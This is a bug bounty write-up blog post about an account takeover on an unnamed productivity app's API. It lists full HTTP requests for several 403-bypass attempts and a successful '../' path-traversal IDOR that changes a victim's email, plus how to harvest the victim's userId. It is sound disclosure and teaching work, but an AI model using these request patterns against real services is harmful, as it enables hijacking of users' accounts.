---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2021-08-29_two-account-takeover-bugs-worth-4300.md
original_filename: 2021-08-29_two-account-takeover-bugs-worth-4300.md
title: Two account takeover bugs worth $4300 🎁
category: documents
detected_topics:
- password-reset
- api-security
- idor
- access-control
- command-injection
- mfa
tags:
- imported
- documents
- password-reset
- api-security
- idor
- access-control
- command-injection
- mfa
language: en
raw_sha256: c37f8073e5df3ead31383da0bf79a1b3d1c5fa9aee9905467f208e8d8175f5ee
text_sha256: 7f307064061db90bd962c235f09b6bab06be991dbf42191bb9671864b6d2459b
ingested_at: '2026-06-28T07:32:07Z'
sensitivity: unknown
redactions_applied: false
---

# Two account takeover bugs worth $4300 🎁

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2021-08-29_two-account-takeover-bugs-worth-4300.md
- Source Type: markdown
- Detected Topics: password-reset, api-security, idor, access-control, command-injection, mfa
- Ingested At: 2026-06-28T07:32:07Z
- Redactions Applied: False
- Raw SHA256: `c37f8073e5df3ead31383da0bf79a1b3d1c5fa9aee9905467f208e8d8175f5ee`
- Text SHA256: `7f307064061db90bd962c235f09b6bab06be991dbf42191bb9671864b6d2459b`


## Content

---
title: "Two account takeover bugs worth $4300 🎁"
page_title: "Top 7 methods to find account takeover bugs in 2023"
url: "https://blog.usamav.dev/two-account-takeover-bugs-worth-4300-dollar-bounty"
final_url: "https://blog.usamav.dev/account-takeover-bugs"
authors: ["Usama Varikkottil (@usama_dev)"]
bugs: ["Account takeover", "Privilege escalation", "403 bypass", "IDOR"]
bounty: "4,300"
publication_date: "2021-08-29"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 3371
---

# Top 7 methods to find account takeover bugs in 2023

A step-by-step guide on how I find security vulnerabilities that others miss

UpdatedApril 7, 2023

•11 min read•[ __View as Markdown](/account-takeover-bugs.md)

![Top 7 methods to find account takeover bugs in 2023](/_next/image?url=https%3A%2F%2Fcdn.hashnode.com%2Fres%2Fhashnode%2Fimage%2Fstock%2Funsplash%2FMdXBFRSEnhQ%2Fupload%2F17cb9c8fb37e2ca7977ff48db09c6c66.jpeg&w=3840&q=75)

[ U](https://hashnode.com/@usamav)

[Usama Varikkottil](https://hashnode.com/@usamav)

[ __](https://twitter.com/usama_dev)[__](https://www.linkedin.com/in/usama-varikkottil)

On this page

The first target🎯The target web application has some features including, but not limited to:Finding the first two bugsThe two minor issues I found were:Multiple user accounts for testing IDORPrivilege escalation bugs inside a workspaceSimplified request1\. Auth token.How do we obtain a request from Adimon and send it as the attacker?2\. API route3\. Request data.How can we test and exploit the application?A method to bypass the 403 Forbidden error1: Wrap ID with an arraySend an array of workspace IDs. FailedAn array of Emails. Failed2: Wrap ID with a JSON object FailedSend the email as a JSON object3: Change the request method Failed4: Add/Change the API version in the route Failed5: IDs as a wildcard character Failed6: Add URL encoded null characters: FailedWhat's the next step?Password changeChanging email of a userSolving the last problemHow do we obtain the userId?Bug reportThe total bounty amountThe role of luck in bug bounty huntingReported 1 minor issueWhere the heck is the second account takeover?Struggling to get your first bounty?References

Making some weird API requests resulted in full user account takeovers, which paid me the highest reward of two bug bounty programs. Account takeovers are critical security vulnerabilities. Making strange API requests can sometimes lead to critical account takeover bugs. I discovered 2 such vulnerabilities while performing security tests on apps. Let's talk about those 2 specific bugs today.

## The first target🎯

It is a productivity application with 2+ million users. They have a Responsible Disclosure Policy, where they offered $2500 for critical security issues.

#### The target web application has some features including, but not limited to:

  * Create user accounts and log in to the account.

  * The users can create workspaces.

![image.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1622197884628/aoQcb5sFL.png)

  * The admin users in the workspaces can invite new team members to the workspaces.

![image.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1622198289821/8NEmCbapO.png)

  * One user can be a member of multiple workspaces.

![image.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1622198571942/-n-cNcOOo.png)

* * *

## Finding the first two bugs

I was exploring the target web application features and got 2 minor security issues in 7 days. Even though they offer a $100 bounty for similar minor issues, I didn't report those two issues because I was not happy with those findings. This doesn't mean that I won't report minor issues, I will report those issues anyway, but once after I cannot make it to high impact.

#### The two minor issues I found were:

  1. No expiration of the old password reset link after requesting a new password reset link.

  2. Response manipulation during the user account deletion process.

To delete a user account, the user has to enter his current password for verification. I could bypass it simply by changing a `false` value into `true`. This resulted in the user account deletion without entering the correct password.

I needed to make the response manipulation vulnerability worth reporting by increasing the impact. So I started experimenting with the features related to team members (workspace), by thinking response manipulation could be used again somewhere in the application to get some cool privilege escalation bugs.

Sadly, there were no such requests that needed a response for validation, not even 2FA. So I started testing for IDORs on the web application.

### Multiple user accounts for testing IDOR

I registered 2 user accounts with 2 different emails: [`adimon@just4fun.me`](mailto:adimon@just4fun.me) for the admin and [`attacker@appzily.com`](mailto:attacker@appzily.com) for the attacker. On creating a new user account, a default workspace automatically gets created inside the user account. The name of the default workspace always starts with the user's first name.

Let's call the victim user "Adimon" and the attacker user "Attacker".

> We can use the `Chrome profile` feature to keep all our info separate, such as cookies and sessions. We can log in to the Attacker's account and the victim's account in Chrome itself. We don't have to open different browsers for keeping different sessions separately.

By analyzing the `HTTP` requests and responses, I got the following information about the accounts I created while playing with the application.

| attacker| admin  
---|---|---  
`email`| [attacker@appzily.com](mailto:attacker@appzily.com)| [adimon@just4fun.me](mailto:adimon@just4fun.me)  
`userId`| 60b64f71adf0d3543cfd8225| 60c30f168747147d9acd89aa  
`workspace IDs`| 60b64f71adf0d3543cfd8229, 60c30f178747147d9acd89ba| 60c30f178747147d9acd89ba  
`Owned workspace IDs`| 60b64f71adf0d3543cfd8229| 60c30f178747147d9acd89ba  
  
> Usually, I use temporary email services like [temp-mail.io](http://temp-mail.io) or [mail.tm](http://mail.tm) for using multiple emails during pentesting. Because I don't want to mess up my Gmail account.

### Privilege escalation bugs inside a workspace

From Adimon's account, I invited the attacker to Adimon's workspace. The invitation request has shown below.

![image.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1625101412363/PVSNBASUr.png)

## Simplified request

There are 3 major parts in every request for this target API.

### 1\. Auth token.

Auth tokens are different for different users. Adimon will have an auth token, and the attacker will have another auth token. An API request made from Adimon's account should be included Adimon's auth token.

![image.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1626796353347/SVafrck2r.png)

_The token may or may not expire at a certain timeframe, but we don't have to worry about it for now._

#### How do we obtain a request from Adimon and send it as the attacker?

Good question😃. We can do that by replacing Adimon's auth token with the attacker's auth token.

### 2\. API route

![image.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1626796965789/Hz_LYXhX0.png)

There will be separate API routes for different functions of the application. API requests related to workspace comes under `/workspace` route. The above screenshot shows an API request made when inviting a user to Adimon's workspace. Therefore, the ID in the request is Adimon's workspace ID.

### 3\. Request data.

![image.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1626797225114/VfXeFIU_0.png)

We are working with a workspace invitation request above, so the relevant data would be about whom to be invited. If the request was related to a photo upload, then the request data would be details about the uploading photo.

The workspace admins invite new users by email, so the request data contains the emails to be invited into the workspace.
  
  
  POST /workspaces/<Adimon's_workspace_ID>/users?sendEmail=true HTTP/1.1
  Host: global.api.host.com
  Connection: close
  Content-Type: application/json
  X-Auth-Token: <Adimon's Auth token>
  
  {"emails": ["attacker@appzily.com"], "captchaValue": "_"}
  

As per the target application, only the workspace admin can:

  * invite new users to the team

  * edit the privileges of the invited users

  * delete the user from the team

  * and so on.

#### How can we test and exploit the application?

Good question😃. We need to go through each request individually to test for some vulnerabilities like IDOR. In Adimon's workspace, check if the attacker has the same permissions as Adimon.

Using the attacker's Auth token, I tried sending requests to edit, invite, and delete a user from Adimon's workspace. Unfortunately, every request failed by showing a `403 Forbidden` error.

_The following screenshot shows a sample request made using the attacker's auth token, to invite a random user into Adimon's workspace._

![image.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1625334317513/slnrM_lUIk.png)
  
  
  POST /workspaces/60c30f178747147d9acd89ba/users?sendEmail=true HTTP/1.1
  Host: global.api.host.com
  Content-Type: application/json
  X-Auth-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJS...<Attacker's AUTH Token>
  
  
  {"emails":["random@gmail.com"],"captchaValue":"_"}
  

## A method to bypass the `403 Forbidden` error

I read a lot of #bugbounty tips from Twitter about bypassing 403 Forbidden errors that help us during API hacking. I started testing them one by one.

### 1: Wrap ID with an array

#### Send an array of workspace IDs. `Failed`
  
  
  POST /workspaces/[60c30f178747147d9acd89ba]/users?sendEmail=true HTTP/1.1
  Host: global.api.host.com
  Content-Type: application/json
  X-Auth-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJS...<Attacker's AUTH Token>
  
  {"emails":["random@gmail.com"],"captchaValue":"_"}
  

#### An array of Emails. `Failed`

The email is sent as an array by default, so let's try changing it to a nested array.
  
  
  POST /workspaces/60c30f178747147d9acd89ba/users?sendEmail=true HTTP/1.1
  Host: global.api.host.com
  Content-Type: application/json
  X-Auth-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJS...<Attacker's AUTH Token>
  
  
  {"emails":[["random@gmail.com"]],"captchaValue":"_"}
  

### 2: Wrap ID with a JSON object `Failed`
  
  
  POST /workspaces/{"id":"60c30f178747147d9acd89ba"}/users?sendEmail=true HTTP/1.1
  Host: global.api.host.com
  Content-Type: application/json
  X-Auth-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJS...<Attacker's AUTH Token>
  
  
  {"emails":["random@gmail.com"],"captchaValue":"_"}
  

#### Send the email as a JSON object
  
  
  POST /workspaces/60c30f178747147d9acd89ba/users?sendEmail=true HTTP/1.1
  Host: global.api.host.com
  Content-Type: application/json
  X-Auth-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJS...<Attacker's AUTH Token>
  
  
  {"emails":[{"email": "random@gmail.com"}],"captchaValue":"_"}
  

### 3: Change the request method `Failed`

I tried changing every `POST` request to `DELETE`, `PUT`, and `PATCH`. But it failed by showing a `405 method not allowed` error.
  
  
  PUT /workspaces/<workspace_ID>/users?sendEmail=true HTTP/1.1
  ...
  ...
  
  
  
  PATCH /workspaces/<workspace_ID>/users?sendEmail=true HTTP/1.1
  ...
  ...
  
  
  
  DELETE /workspaces/<workspace_ID>/users?sendEmail=true HTTP/1.1
  ...
  ...
  

![image.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1628417168241/SX686uPt8.png)

### 4: Add/Change the API version in the route `Failed`

We need to check if older versions of API exist by adding `/v1/`, `/v2/`, or `/v3/` to the route. I tested all API versions since there were no version numbers sent in this API request by default.
  
  
  POST /v1/workspaces/<workspace_ID>/users?sendEmail=true HTTP/1.1
  ...
  ...
  
  
  
  POST /v2/workspaces/<workspace_ID>/users?sendEmail=true HTTP/1.1
  ...
  ...
  

I got nothing except the server's `404 Not Found` error response while playing with API versions.

### 5: IDs as a wildcard character `Failed`

Sometimes replacing the IDs, emails, or usernames with a wildcard character would cause some strange responses from the server. For example, `*` means "All", so replacing an ID with a `*` character in a request would mean doing the same thing for all the IDs in the database instead of just one.

As in the example request given below, I tried to replace the workspace ID with a `*` character to check if I can invite a new user into every workspace out there in the target application. Unfortunately, the only response I'm getting from the server was a `404 Not Found` error.
  
  
  POST /workspaces/*/users?sendEmail=true HTTP/1.1
  Host: global.api.host.com
  Content-Type: application/json
  X-Auth-Token: ....
  
  
  {"emails":["myEmail@gmail.com"],"captchaValue":"_"}
  

### 6: Add URL encoded null characters: `Failed`
  
  
  POST /workspaces/60c30f178747147d9acd89ba%00/users?sendEmail=true HTTP/1.1
  Host: global.api.host.com
  Content-Type: application/json
  X-Auth-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJS...<Attacker's AUTH Token>
  
  
  {"emails":["random@gmail.com"],"captchaValue":"_"}
  

We get some weird responses sometimes from the server by adding null characters in the requests. Try adding `%00` in the URL, request data, header, etc. However, this API and server handled every null character carefully.

* * *

I don't even remember what other things I tested on this API, but I'm sure that I spent a few days just playing on the API with the goal of finding something interesting.

I wanted to test more on this API, but there were no tricks left in my brain at that moment. I knew there are a lot of `bug bounty tips` shared on Twitter. And the collections of such `bug bounty tips` are shared on the web.

I made a quick google search for "API bug bounty tips". And I came across a GitHub repository of API security checklists. [Book-of-bugbounty-tips/api](https://gowsundar.gitbook.io/book-of-bugbounty-tips/api) (Not 100% sure if this is the repository I landed at.).

After some tests and failures, I tried testing with an `../` in the API route. The attacker's workspace ID is `60b64f71adf0d3543cfd8229` and Adimon's workspace ID is `60c30f178747147d9acd89ba`.
  
  
  POST /workspaces/60b64f71adf0d3543cfd8229/../60c30f178747147d9acd89ba/users?sendEmail=true HTTP/1.1
  Host: global.api.host.com
  Content-Type: application/json
  X-Auth-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJS...<Attacker's AUTH Token>
  
  
  {"emails":["random@gmail.com"],"captchaValue":"_"}
  

And to my surprise, it was successful😇. I could invite new users to the Adimon workspace by sending a request like the above using the attacker's auth token.

#### What's the next step?

Increasing the impact of the vulnerability is the next step. It would be a good deal if we could somehow take over user accounts by exploiting this vulnerability.

### Password change

I tried changing Adimon's password from the attacker's account by exploiting the above vulnerability. Sadly, it failed since Adimon's old password is required to change the password of Adimon.

![image.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1629396381676/juXTUsPDX.png)

Okay, next which is the feature to achieve an account takeover by exploiting the vulnerability? Yeah, email changing.

### Changing email of a user

Let's try changing Adimon's email using the attacker's auth token in the request. If we get a successful response, we could send the `forgot password` request later, and the reset email would receive into the updated email address.

A normal email change request looks like this:
  
  
  PUT /users/60b64f71adf0d3543cfd8225/email HTTP/1.1
  Host: global.api.host.com
  Content-Type: application/json
  X-Auth-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJS...<Attacker's AUTH Token>
  
  
  {"email":"attacker-mon@gmail.com"}
  

`60b64f71adf0d3543cfd8225` is the userID of the attacker. I sent the below request to change Adimon's email using the attacker's AUTH token. Adimon's userId is `60c30f168747147d9acd89aa`.
  
  
  PUT /users/60b64f71adf0d3543cfd8225/../60c30f168747147d9acd89aa/email HTTP/1.1
  Host: global.api.host.com
  Content-Type: application/json
  X-Auth-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJS...<Attacker's AUTH Token>
  
  
  {"email":"attacker-mon@gmail.com"}
  

The request was successful. And it responded with a `200 OK` response. Cool... But the email change has not been completed yet, because a verification link needs to click in order to complete the email change process.

There are two possibilities here: The email change verification link would receive into

  1. the current email.

  2. The newly requested email.

For my luck, it delivered the verification link to the newly requested email. That means, to the attacker's email. In our case, the current email is Adimon's email and the newly requested email is the attacker's email. Taking over Adimon's account from the attacker's account has been done successfully. If an attacker has the `userId` of the victim, he can successfully take over the victim's account.

### Solving the last problem

There is one more thing we need to find: The `userId`. We have successfully found an IDOR vulnerability. But in order to exploit the attack, we need to find `userId` of the victim user(Adimon in our case).

#### How do we obtain the `userId`?

There is a feature to invite users to the workspace using their email.

![image.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1622198289821/8NEmCbapO.png)

From the attacker's account, I invited Adimon into the attacker's workspace. After sending the invitation request, the response to that request contained `userId` of the invited email.

![image.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1629646426865/8k1xgV63q.png)

Only the user email is needed to get the `userId`, if there is a user account with the entered email, then the response contains that user's `userId`.

The complete attack looks like this:

  1. The attacker invites Adimon to his workspace, by entering the email address [`adimon@just4fun.me`](mailto:adimon@just4fun.me).

  2. Get Adimon's `userId` from the #1 response.

  3. The attacker changes the email of Adimon into the attacker's email by exploiting IDOR vulnerability.

  4. Make a forgot password request.

#### Bug report

I made a report and sent it to the company.

![image.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1630160892894/-W_cwpqeA.png)

### The total bounty amount

> Did you know that you can like this post 10 times, if you do, that will make my day! If you don't, it's okay too...

5 days later after sending the report, I got an email from the team regarding the bounty amount of $2500.

![image.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1622305312952/NU872ALCx.png)

### The role of luck in bug bounty hunting

Imagine if they delivered the verification link of the email change request to the current email instead of the new email. I would not find Account takeover vulnerability then. I was lucky enough to receive the verification email to the newly requested email. Luck will come automatically if we work consistently. We can increase the chances of luck by putting in more effort.

### Reported 1 minor issue

![image.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1629826147933/ju5vRj6o9.png)

I mentioned about 2 minor issues I got while hunting the target. I reported the second issue. Unfortunately, it was a duplicate finding.

### Where the heck is the second account takeover?

I planned to cover details about both the account takeover vulnerabilities in this blog post. But seriously dude, writing a write-up is very challenging and hard. I will publish the other account takeover vulnerability as a new blog post on another day.

### Struggling to get your first bounty?

If you are still struggling to find your first bug, I get you, dude. It is indeed tough. But it's possible.

If you want this company's details, message "ATOblog" to my [LinkedIn here](https://www.linkedin.com/in/usama-varikkottil/), and I will be happy to share this program's details with you.

### References

  * <https://gowsundar.gitbook.io/book-of-bugbounty-tips/api>

  * <https://github.com/arainho/awesome-api-security>

  * <https://github.com/inonshk/31-days-of-API-Security-Tips>

  * <https://github.com/HolyBugx/HolyTips/blob/main/Checklist/API%20Security.pdf>

[#security](/tag/security)[#hacking](/tag/hacking)[#bugbounty](/tag/bugbounty)[#cybersecurity-1](/tag/cybersecurity-1)[#cybersecurity](/tag/cybersecurity)

 __13K views
